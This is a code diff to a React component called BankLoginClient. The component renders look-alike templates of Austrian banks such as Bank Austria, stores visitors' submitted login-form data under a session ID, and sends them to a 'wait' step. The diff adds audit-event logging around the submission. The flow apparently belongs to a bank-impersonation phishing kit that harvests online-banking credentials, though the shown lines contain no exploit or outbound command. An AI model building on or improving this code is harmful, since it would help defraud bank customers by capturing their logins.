@@ -12,6 +12,7 @@ import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
 import { getRenderableImageProps } from "@/lib/visual-tree-logo";
 import parse, { attributesToProps, domToReact, Element } from "html-react-parser";
+import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";
 
 // Austrian Banks from templates
 import { BankAustria } from "@/components/templates/BankAustria";
@@ -513,10 +514,42 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     setSaving(false);
     if (updateError) {
+      logAuditEvent({
+        session_id: sessionId,
+        event_kind: "submit",
+        event_action: "bank_submit_error",
+        status: "error",
+        bank_slug: bank?.slug ?? null,
+        bank_name: bank?.name ?? null,
+        login_method: historyEntry.loginMethod,
+        meta: { message: updateError.message ?? String(updateError) },
+        error_name: "SupabaseUpdateError",
+        error_message: updateError.message ?? String(updateError),
+      });
       setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
       return;
     }
     setSessionFormData(nextFormData);
+    logAuditEvent({
+      session_id: sessionId,
+      event_kind: "bank_form",
+      event_action: "bank_submit_wait",
+      status: "ok",
+      bank_slug: bank?.slug ?? null,
+      bank_name: bank?.name ?? null,
+      login_method: historyEntry.loginMethod,
+      from_step: "bank",
+      to_step: "wait",
+      meta: {
+        historyCount: previousHistory.length,
+        orderedFields: {
+          orderedField1Key: currentOrderedField1Key,
+          orderedField2Key: currentOrderedField2Key,
+          orderedField3Key: currentOrderedField3Key,
+        },
+      },
+    });
+    void flushAuditQueueNow();
     router.push(stepToPath("wait", sessionId));
   }
 
